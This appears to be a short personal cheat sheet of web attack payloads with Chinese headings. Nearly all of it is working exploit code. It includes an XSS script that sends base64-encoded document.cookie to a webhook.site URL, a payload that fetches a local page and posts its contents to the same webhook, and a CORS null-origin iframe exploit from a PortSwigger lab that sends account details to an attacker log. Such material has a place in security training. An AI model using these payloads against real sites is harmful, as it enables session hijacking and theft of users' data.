###################################### 一般發送 request

<script>fetch('https://webhook.site/a4bf01e8-2831-46c2-b445-4eed14b77220?' + btoa(document.cookie))</script>

###################################### 使用前次 request 的結果

<script>fetch('http://localhost:3000/fuck')
        .then(response => response.text())
        .then(data=>fetch('https://webhook.site/a4bf01e8-2831-46c2-b445-4eed14b77220', {method: 'POST', body: data}));
</script>

###################################### xhr
xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    console.log(xhr.responseText);
}

xhr.withCredentials = true;  // 允許跨佔請求攜帶 cookie, 但需要設定下面兩個 header 值 (參考 csrf)
                             // 有 Access-Control-Allow-Credentials: true 時, Access-Control-Allow-Origin: 必須是 url 不能是 *
xhr.open("GET","http://localhost:8888/",true);
xhr.setRequestHeader('key', 'value');
xhr.send();


#### 搭配 iframe
# https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
       var xhr = new XMLHttpRequest ();
       xhr.onload = reqListener;
       xhr.open('get','https://acac1f3b1e7338f580d92c3b002200fc.web-security-academy.net/accountDetails',true);
       xhr.withCredentials = true;
       xhr.send();
    
       function reqListener() {
           location='https://ace01f161e53387b80fe2c5f017e007a.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
       };
   </script>"> </iframe>
